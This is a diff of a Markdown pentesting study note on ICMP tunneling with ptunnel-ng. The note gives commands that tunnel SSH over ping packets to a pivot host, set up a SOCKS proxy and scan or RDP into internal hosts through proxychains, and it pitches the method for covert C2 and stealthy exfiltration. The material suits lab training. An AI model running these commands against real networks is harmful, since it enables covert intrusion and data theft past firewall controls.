@@ -1,118 +1,145 @@
-### Overview
+# ICMP Tunneling with SOCKS
 
-ICMP tunneling encapsulates traffic within ICMP echo request and response packets. It is only effective when ping responses are permitted through a firewall. If allowed, internal hosts can use ping traffic to tunnel data to external servers, which can validate and respond accordingly. This technique is useful for stealthy data exfiltration or establishing pivot tunnels.
-
-In this scenario, we’ll use **ptunnel-ng** to create an ICMP tunnel between a **Pivot Host** (Ubuntu server) and the **Attack Host**.
-
----
-
-### Scenario
-
-- **Pivot Host (Ubuntu)**: `10.129.202.64`, `172.16.5.129`
-- **Attack Host**: `10.10.14.18`
-
-The Ubuntu server sits in the internal network and is accessible by ICMP. We will create an SSH connection through ICMP between the attack host and pivot host.
+**Back to:** [[Pivoting, Tunneling and Port Forwarding|Pivoting Index]]
+**Related:** [[DNS Tunnelling with Dnscat2|DNS Tunneling]], [[SSH Socks Tunnel PF|SSH SOCKS Tunnel]], [[Web Server Pivoting with Rpivot|Rpivot]]
 
 ---
 
-## Step-by-Step Instructions
+## Overview
 
-### Step 1: Clone ptunnel-ng (Attack Host)
+ICMP tunneling encapsulates traffic within ICMP echo request/response packets (ping). This covert channel bypasses firewalls that allow ICMP but block other protocols. Useful for exfiltration and pivoting when only ICMP egress is permitted.
 
-```Shell
+**Key Features:**
+- Tunnels data in ICMP packets
+- Bypasses strict firewalls
+- Covert communication channel
+- SSH-over-ICMP capable
+- Stealth data exfiltration
+
+**Use Cases:**
+- Only ICMP allowed outbound
+- All TCP/UDP ports blocked
+- Extreme firewall restrictions
+- Need covert C2 channel
+- Data exfiltration via ping
+
+**Requirements:**
+- Root/admin on both ends
+- ICMP echo allowed through firewall
+- Network stack manipulation capability
+
+---
+
+## Tool: ptunnel-ng
+
+### Installation
+
+```bash
+# Clone and build
 git clone https://github.com/utoni/ptunnel-ng.git
-```
-
-### Step 2: Build ptunnel-ng (Attack Host)
-
-```Shell
 cd ptunnel-ng
+sudo apt-get install automake autoconf -y
 sudo ./autogen.sh
 ```
 
-### Alternative Build (Static Binary)
+### Transfer to Pivot
 
-```Shell
-sudo apt install automake autoconf -y
-sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\\/configure" --enable-static $@ \\&\\& make clean \\&\\& make -j${BUILDJOBS:-4} all/' autogen.sh
-./autogen.sh
-```
-
-### Step 3: Transfer ptunnel-ng to Pivot Host (Attack Host)
-
-```Shell
+```bash
 scp -r ptunnel-ng ubuntu@10.129.202.64:~/
 ```
 
 ---
 
-## Establishing the Tunnel
+## Basic Setup
 
-### Step 4: Start ptunnel-ng Server (Pivot Host)
+### Server on Pivot
 
-```Shell
-cd ~/ptunnel-ng/src
+```bash
+cd ptunnel-ng/src
 sudo ./ptunnel-ng -r10.129.202.64 -R22
 ```
 
-- Forwards ICMP packets to TCP port `22` (SSH).
+### Client on Attack Machine
 
-### Step 5: Start ptunnel-ng Client (Attack Host)
-
-```Shell
+```bash
 sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
 ```
 
-- Opens local port `2222` for tunneling SSH through ICMP to pivot host.
+### Connect via SSH
 
-### Step 6: Connect via SSH over ICMP (Attack Host)
-
-```Shell
-ssh -p2222 -lubuntu 127.0.0.1
+```bash
+ssh -p 2222 -l ubuntu 127.0.0.1
 ```
-
-- Connects to the pivot host over the ICMP tunnel.
 
 ---
 
-## Optional: Proxying Over the Tunnel
+## SOCKS Proxy Over ICMP
 
-### Step 7: Start Dynamic Port Forwarding Over SSH (Attack Host)
+### Enable Dynamic Forward
 
-```Shell
-ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+```bash
+ssh -D 9050 -p 2222 -l ubuntu 127.0.0.1
 ```
 
-- Opens SOCKS proxy on port `9050`.
+### Configure Proxychains
 
-### Step 8: Update proxychains.conf (Attack Host)
-
-```Plain
-[ProxyList]
+```bash
+# /etc/proxychains.conf
 socks5 127.0.0.1 9050
 ```
 
-### Step 9: Scan Internal Host via Proxy (Attack Host)
+### Use Tools
 
-```Shell
-proxychains nmap -sV -sT 172.16.5.19 -p3389
+```bash
+proxychains nmap -sT -Pn 172.16.5.19
+proxychains xfreerdp /v:172.16.5.19 /u:admin /p:pass
 ```
 
 ---
 
-## Confirming Traffic Behavior
+## Performance Notes
 
-Use Wireshark to verify the tunneling behavior:
+**Expected Speed:** 1-5 KB/s (very slow)
+**Latency:** High
+**Best for:** C2 channels, not bulk transfer
 
-- Run `ssh ubuntu@10.129.202.64` — you’ll see typical TCP/SSHv2 traffic.
-- Run `ssh -p2222 -lubuntu 127.0.0.1` — traffic will be ICMP-based.
+---
 
-Monitoring ptunnel-ng output provides real-time session statistics:
+## Comparison with Other Covert Channels
 
-```Plain
-[inf]: Starting new session to 10.129.202.64:22 with ID 20199
-[inf]: Session statistics:
-[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R: 248/22/0 Loss: 0.0%
+| Feature | ICMP | [[DNS Tunnelling with Dnscat2\|DNS]] | [[Web Server Pivoting with Rpivot\|HTTP]] |
+|---------|------|------|------|
+| Speed | Very Slow | Slow | Fast |
+| Stealth | Very High | High | Medium |
+| Firewall Bypass | Excellent | Excellent | Good |
+
+---
+
+## Quick Reference
+
+```bash
+# Server (pivot)
+sudo ./ptunnel-ng -r PIVOT_IP -R22
+
+# Client (attacker)
+sudo ./ptunnel-ng -p PIVOT_IP -l2222 -r PIVOT_IP -R22
+
+# SSH through tunnel
+ssh -p 2222 ubuntu@127.0.0.1
+
+# SSH with SOCKS
+ssh -D 9050 -p 2222 ubuntu@127.0.0.1
+
+# With password
+sudo ./ptunnel-ng -p PIVOT_IP -l2222 -r PIVOT_IP -R22 -xPASSWORD
 ```
 
 ---
+
+**See Also:**
+- [[Pivoting, Tunneling and Port Forwarding|Main Pivoting Index]]
+- [[DNS Tunnelling with Dnscat2|DNS Covert Channel]]
+- [[SSH Socks Tunnel PF|SSH SOCKS Tunnel]]
+- [[Defending and Detection/Defending and Detection|Detection & Defense]]
+
+**Tags:** #icmp-tunnel #covert-channel #ptunnel-ng #firewall-bypass #stealth #ping-tunnel
